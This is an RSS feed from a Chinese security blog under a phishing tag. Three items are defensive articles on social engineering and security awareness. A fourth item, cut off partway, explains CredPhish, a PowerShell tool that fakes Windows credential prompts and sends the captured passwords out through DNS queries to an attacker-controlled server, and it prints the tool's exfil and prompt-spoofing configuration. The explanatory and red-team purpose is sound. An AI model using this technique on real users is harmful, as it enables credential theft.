<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>钓鱼攻击 on 办公AI智能小助手</title>
        <link>http://localhost:1313/tags/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/</link>
        <description>Recent content in 钓鱼攻击 on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright>
        <lastBuildDate>Thu, 07 Aug 2025 02:41:27 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>如何阻断由社会工程学引发的网络攻击</title>
        <link>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E9%98%BB%E6%96%AD%E7%94%B1%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E5%BC%95%E5%8F%91%E7%9A%84%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB/</link>
        <pubDate>Thu, 07 Aug 2025 02:41:27 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%A6%82%E4%BD%95%E9%98%BB%E6%96%AD%E7%94%B1%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E5%BC%95%E5%8F%91%E7%9A%84%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB/</guid>
        <description>&lt;p&gt;本译文基于微软安全响应中心博客&amp;quot;How to disrupt attacks caused by social engineering&amp;quot;（2018年1月10日发布）。&lt;/p&gt;
&lt;p&gt;十年前，大多数网络攻击通过恶意软件或复合手段直接针对企业基础设施发起。如今情况已截然不同，一封精心设计的窃取身份信息的邮件就足以构成威胁。&lt;/p&gt;
&lt;p&gt;数字化转型已成为不可逆转的趋势。微软的安全战略聚焦于实现安全的数字化转型，通过帮助客户建立网络犯罪防护、检测和响应能力来实现这一目标。&lt;/p&gt;
&lt;p&gt;社会工程学手法并非新鲜事物，早在宽带网络出现前就已存在。现代威胁组织如STRONTIUM沿用了传统骗术，只是将战场转移到了数字世界。相比寻找系统漏洞，他们更倾向于发送高仿真钓鱼邮件。&lt;/p&gt;
&lt;p&gt;根据Verizon《2016年数据泄露调查报告》：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;30%的钓鱼邮件会被打开&lt;/li&gt;
&lt;li&gt;收件人平均仅需40秒就会打开邮件&lt;/li&gt;
&lt;li&gt;45秒内就会点击恶意附件&lt;/li&gt;
&lt;li&gt;89%的钓鱼邮件来自有组织犯罪集团&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;图1展示了Verizon调查报告的关键数据。现代钓鱼邮件的制作流程包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过社交网络搜集目标信息（组织架构、邮件模板等）&lt;/li&gt;
&lt;li&gt;使用专业工具从公开/泄露数据库提取数据&lt;/li&gt;
&lt;li&gt;制作仿冒邮件模板（如密码重置通知）&lt;/li&gt;
&lt;li&gt;发送给目标用户&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;攻击分为五个阶段：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;确定目标员工&lt;/li&gt;
&lt;li&gt;诱导打开恶意邮件&lt;/li&gt;
&lt;li&gt;工作站沦陷，收集凭证&lt;/li&gt;
&lt;li&gt;横向移动获取未授权访问&lt;/li&gt;
&lt;li&gt;窃取敏感数据&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;图4展示了微软安全产品在各阶段的防护能力：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Enterprise Mobility + Security提供身份保护&lt;/li&gt;
&lt;li&gt;Windows 10具备设备级防护&lt;/li&gt;
&lt;li&gt;Office 365防范邮件威胁&lt;/li&gt;
&lt;li&gt;Azure确保云安全&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;企业需要转变安全思维，从&amp;quot;被动防御&amp;quot;转向&amp;quot;假设已被入侵&amp;quot;的主动防御模式。无论规模大小，所有企业都存储着对攻击者有价值的数据。&lt;/p&gt;
&lt;p&gt;完整的安全方案需要包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;完善的事件响应流程&lt;/li&gt;
&lt;li&gt;防护/检测/响应技术栈&lt;/li&gt;
&lt;li&gt;IT人员和终端用户的充分准备&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;更多微软安全产品信息请访问：&lt;a class=&#34;link&#34; href=&#34;https://www.microsoft.com/secure&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.microsoft.com/secure&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>防御安全播客第291期：从Tenable插件故障到AI钓鱼邮件的技术剖析</title>
        <link>http://localhost:1313/p/%E9%98%B2%E5%BE%A1%E5%AE%89%E5%85%A8%E6%92%AD%E5%AE%A2%E7%AC%AC291%E6%9C%9F%E4%BB%8Etenable%E6%8F%92%E4%BB%B6%E6%95%85%E9%9A%9C%E5%88%B0ai%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%89%96%E6%9E%90/</link>
        <pubDate>Wed, 06 Aug 2025 02:07:08 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%98%B2%E5%BE%A1%E5%AE%89%E5%85%A8%E6%92%AD%E5%AE%A2%E7%AC%AC291%E6%9C%9F%E4%BB%8Etenable%E6%8F%92%E4%BB%B6%E6%95%85%E9%9A%9C%E5%88%B0ai%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%89%96%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;技术要点讨论&#34;&gt;技术要点讨论
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Tenable插件更新事故&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;全球Nessus代理因恶意插件更新大规模瘫痪&lt;/li&gt;
&lt;li&gt;事故根源分析与供应链安全启示&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Chrome扩展劫持事件&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;攻击者通过OAuth信任漏洞劫持35个官方扩展&lt;/li&gt;
&lt;li&gt;详细技术路径：从代码注入到权限提升&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;医疗HIPAA新规解读&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;新规强制要求医疗系统实施主动防御措施&lt;/li&gt;
&lt;li&gt;包括实时威胁监测和加密传输的硬性标准&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;AI生成钓鱼邮件演进&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;针对企业高管的个性化钓鱼邮件生成技术&lt;/li&gt;
&lt;li&gt;自然语言处理在攻击中的滥用案例&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Passkey技术困境&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;跨平台认证协议兼容性问题&lt;/li&gt;
&lt;li&gt;生物识别与硬件密钥的部署成本分析&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;相关技术资料&#34;&gt;相关技术资料
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.bleepingcomputer.com/news/security/bad-tenable-plugin-updates-take-down-nessus-agents-worldwide/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Nessus全球故障分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.bleepingcomputer.com/news/security/new-details-reveal-how-hackers-hijacked-35-google-chrome-extensions/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Chrome扩展劫持技术细节&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.darkreading.com/vulnerabilities-threats/hipaa-security-rules-pull-no-punches&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;HIPAA安全规则全文&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://arstechnica.com/security/2025/01/ai-generated-phishing-emails-are-getting-very-good-at-targeting-executives/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;AI钓鱼邮件技术报告&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://arstechnica.com/security/2024/12/passkey-technology-is-elegant-but-its-most-definitely-not-usable-security/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Passkey技术白皮书&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>将人为漏洞转化为组织优势：构建以人为核心的网络安全防线</title>
        <link>http://localhost:1313/p/%E5%B0%86%E4%BA%BA%E4%B8%BA%E6%BC%8F%E6%B4%9E%E8%BD%AC%E5%8C%96%E4%B8%BA%E7%BB%84%E7%BB%87%E4%BC%98%E5%8A%BF%E6%9E%84%E5%BB%BA%E4%BB%A5%E4%BA%BA%E4%B8%BA%E6%A0%B8%E5%BF%83%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%98%B2%E7%BA%BF/</link>
        <pubDate>Tue, 05 Aug 2025 04:54:45 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%B0%86%E4%BA%BA%E4%B8%BA%E6%BC%8F%E6%B4%9E%E8%BD%AC%E5%8C%96%E4%B8%BA%E7%BB%84%E7%BB%87%E4%BC%98%E5%8A%BF%E6%9E%84%E5%BB%BA%E4%BB%A5%E4%BA%BA%E4%B8%BA%E6%A0%B8%E5%BF%83%E7%9A%84%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%98%B2%E7%BA%BF/</guid>
        <description>&lt;h1 id=&#34;将人为漏洞转化为组织优势&#34;&gt;将人为漏洞转化为组织优势
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;来源&lt;/strong&gt;：Stephen Frost via Alamy Stock Photo&lt;br&gt;
&lt;strong&gt;评论文章&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在动态变化的威胁环境中，有一种攻击手段始终顽固存在并持续有效：钓鱼攻击。尽管技术防御不断进步，但威胁行为体正加倍利用人性弱点，使钓鱼攻击不仅构成威胁，更演变成需要紧急应对的全面流行病。&lt;/p&gt;
&lt;h2 id=&#34;顽固的人为因素&#34;&gt;顽固的人为因素
&lt;/h2&gt;&lt;p&gt;包括Verizon最新《数据泄露调查报告》(DBIR)在内的权威研究显示，人为因素仍是导致安全漏洞的主要攻击媒介。约60%的初始入侵事件源于用户行为：点击恶意链接、打开带毒附件或落入社会工程陷阱。&lt;/p&gt;
&lt;p&gt;现代骗局已逼真到连终端防护工具和防火墙都无法完全弥补人为漏洞。更值得关注的是，约20%-30%的泄露事件（如DBIR所述）源于凭证重复使用。这本质上仍是人性使然——便利性往往战胜安全最佳实践。钓鱼攻击与凭证复用的双重影响表明：人为因素驱动着绝大多数成功的初始入侵。&lt;/p&gt;
&lt;h2 id=&#34;进化中的威胁超越表象&#34;&gt;进化中的威胁：超越表象
&lt;/h2&gt;&lt;p&gt;钓鱼攻击不仅持续存在，更朝着精细化方向发展：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;超个性化&lt;/strong&gt;：告别&amp;quot;尊敬的客户&amp;quot;式群发骗局，攻击者利用社交媒体、历史泄露数据等信息定制含个人姓名、职位甚至出差记录的可信钓饵&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;多渠道攻击&lt;/strong&gt;：短信钓鱼(Smishing)和语音钓鱼(Vishing)激增，利用人们对电话/短信的天然信任绕过邮件过滤器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;热点事件利用&lt;/strong&gt;：网络罪犯巧妙结合全球新闻、经济焦虑、节日热点等制造紧迫性陷阱&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;商业邮件欺诈(BEC)&lt;/strong&gt;：通过深度伪装高管/供应商，研究内部审批流程实施精准财务欺诈&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;行业脆弱性图谱&#34;&gt;行业脆弱性图谱
&lt;/h2&gt;&lt;p&gt;KnowBe4模拟钓鱼测试数据显示：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;医疗教育&lt;/strong&gt;：非技术人员占比高+高压环境+敏感数据，点击率居高不下&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;金融专业服务&lt;/strong&gt;：直接资金收益诱使攻击者伪造客户请求等专业话术&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关键基础设施&lt;/strong&gt;：伪造维护警报窃取工业知识产权的新型攻击涌现&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;构建人为韧性的五大策略&#34;&gt;构建人为韧性的五大策略
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;动态安全意识培训&lt;/strong&gt;&lt;br&gt;
超越年度合规检查，采用微课程、交互模拟、游戏化等持续培训形式，内容需随威胁战术进化实时更新&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;钓鱼模拟实战&lt;/strong&gt;&lt;br&gt;
定期开展部门定制的钓鱼测试，点击后即时反馈具体风险指标，转化为教学机会而非惩罚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;无障碍报告文化&lt;/strong&gt;&lt;br&gt;
建立免追责的异常行为报告机制，每份报告都是潜在漏洞的早期预警&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;分层技术控制&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AI邮件安全：实时检测仿冒邮件与恶意附件&lt;/li&gt;
&lt;li&gt;多因素认证(MFA)：缓解凭证泄露影响的最有效技术&lt;/li&gt;
&lt;li&gt;零信任架构：基于最小权限原则的持续验证机制&lt;/li&gt;
&lt;li&gt;商用密码管理器：杜绝密码复用现象&lt;/li&gt;
&lt;li&gt;DNS安全过滤：阻断恶意域名访问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;领导层示范&lt;/strong&gt;&lt;br&gt;
高管需亲身参与安全培训，将网络安全定位为业务赋能项而非IT职能&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;将人为防线转化为最强壁垒&#34;&gt;将人为防线转化为最强壁垒
&lt;/h2&gt;&lt;p&gt;面对钓鱼疫情，需建立&amp;quot;承认人为漏洞客观存在&amp;quot;的防御思维。通过培养批判性思维的安全意识培训、构建警惕性组织文化，结合零信任/MFA等技术控制，目标不是追求绝对安全（攻击总会得逞部分目标），而是建立快速识别/报告/阻断的群体韧性，最终将&amp;quot;最薄弱环节&amp;quot;转化为&amp;quot;最强防御战线&amp;quot;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关于作者&lt;/strong&gt;&lt;br&gt;
Erich Kron&lt;br&gt;
KnowBe4安全意识倡导者，拥有25年信息安全从业经验，曾任美国陆军第二区域网络中心安全经理，持有CISSP等多项认证。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>使用PowerShell进行用户密码钓鱼的技术解析</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8powershell%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%92%93%E9%B1%BC%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 18:13:46 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8powershell%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%92%93%E9%B1%BC%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;使用powershell进行用户密码钓鱼的技术解析&#34;&gt;使用PowerShell进行用户密码钓鱼的技术解析
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;tokyoneon&lt;/strong&gt; //&lt;br&gt;
伪造凭证提示是一种有效的权限提升和横向移动技术。在Windows环境中，用户经常会遇到看似随机的密码提示，例如Outlook、VPN和其他各种认证协议。攻击者会滥用Windows和PowerShell内置功能来调用凭证弹窗以获取用户密码。&lt;/p&gt;
&lt;p&gt;根据&lt;strong&gt;MITRE ATT&amp;amp;CK框架&lt;/strong&gt;的定义：&lt;br&gt;
“当需要额外权限的程序执行时，操作系统通常会提示用户输入正确的凭证以授权任务的提升权限。攻击者可能会模仿常见的操作系统组件，通过PowerShell等语言显示看似合法的凭证提示。”&lt;/p&gt;
&lt;h2 id=&#34;什么是credphish&#34;&gt;什么是CredPhish？
&lt;/h2&gt;&lt;p&gt;CredPhish是一个PowerShell脚本，旨在调用凭证提示并窃取密码。它依赖于&lt;strong&gt;CredentialPicker API&lt;/strong&gt;收集用户密码，使用PowerShell的&lt;strong&gt;Resolve-DnsName&lt;/strong&gt;进行DNS外传数据，并利用Windows Defender的&lt;strong&gt;ConfigSecurityPolicy.exe&lt;/strong&gt;执行任意GET请求。&lt;/p&gt;
&lt;p&gt;下图展示了CredPhish的实际操作。请注意，在Windows安全提示中提交凭证后，凭证会立即发送到攻击者的DNS服务器。&lt;/p&gt;
&lt;p&gt;默认情况下，CredPhish会使用PowerShell内置的DNS解析器&lt;strong&gt;Resolve-DnsName&lt;/strong&gt;外传凭证。它会将凭证中的每个字符转换为十六进制值，将转换后的值分成预定义的块，并将这些块放入热门网站的子域名中。以下截图显示了十六进制形式的外传凭证示例。注意“tokyoneon”的十六进制值（746f6b796f6e656f6e）出现在google.com和office.com的子域名中。&lt;/p&gt;
&lt;p&gt;在解析DNS查询之前，DNS服务器会剥离十六进制子域名以避免生成大量错误响应。在下面的Wireshark截图中，请注意“Answers”字段不再包含子域名，并成功解析为Google的一个IP地址。&lt;/p&gt;
&lt;h2 id=&#34;credphishps1配置&#34;&gt;CredPhish.ps1配置
&lt;/h2&gt;&lt;p&gt;CredPhish.ps1设计为一个独立的脚本，不需要&lt;strong&gt;Import-Module&lt;/strong&gt;（这是一种常见的攻击指标）。可配置选项以变量的形式位于PS1脚本的顶部，以避免冗长的命令行参数。&lt;/p&gt;
&lt;p&gt;第一行是最重要的，它定义了外传数据的接收地址（即攻击者的Kali服务器）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# exfil address  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$exfilServer&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.56.112&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;接下来的几个变量定义了提示框对目标用户的显示方式。&lt;strong&gt;$promptCaption&lt;/strong&gt;定义了请求凭证的“应用程序”（例如“Microsoft Office”），而**$promptMessage**通常指定与请求关联的账户。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# prompt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$targetUser&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$env:username&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$companyEmail&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;blackhillsinfosec.com&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$promptCaption&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Microsoft Office&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$promptMessage&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Connecting to: &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$targetUser&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$companyEmail&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$maxTries&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 提示框的最大调用次数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$delayPrompts&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 提示框之间的延迟（秒）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$validateCredentials&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;$false&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 如果凭证有效，则中断$maxTries并立即外传&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;$maxTries&lt;/strong&gt;变量定义了提示框在目标提交凭证之前显示的次数。默认值为&lt;strong&gt;1&lt;/strong&gt;以避免引起怀疑。&lt;strong&gt;$delayPrompts&lt;/strong&gt;变量定义了每次提示之间的延迟时间（如果**$maxTries&lt;strong&gt;大于1）。&lt;/strong&gt;$validateCredentials&lt;strong&gt;默认禁用，它会尝试通过在高权限上下文中使用&lt;/strong&gt;Start-Process&lt;strong&gt;来本地验证提交的凭证。如果启用且凭证验证通过，则忽略&lt;/strong&gt;$maxTries**，数据会立即发送到攻击者的服务器。&lt;/p&gt;
&lt;h2 id=&#34;数据外传方法&#34;&gt;数据外传方法
&lt;/h2&gt;&lt;p&gt;如前所述，DNS外传是默认的密码传输方法。&lt;strong&gt;$exfilDomains&lt;/strong&gt;列表包含用于DNS查询的各种域名，并随机选择。&lt;strong&gt;$subdomainLength&lt;/strong&gt;变量确定每个子域名的期望长度。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# dns&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# 在Kali中启动DNS服务器：python3 /path/to/credphish/dns_server.py&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$enableDnsExfil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;$true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$exfilDomains&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.microsoft.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.google.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.office.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.live.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 用于DNS外传的域名&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$randomDelay&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;get-random&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-minimum&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-maximum&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# DNS查询之间的随机延迟&lt;/span&gt;
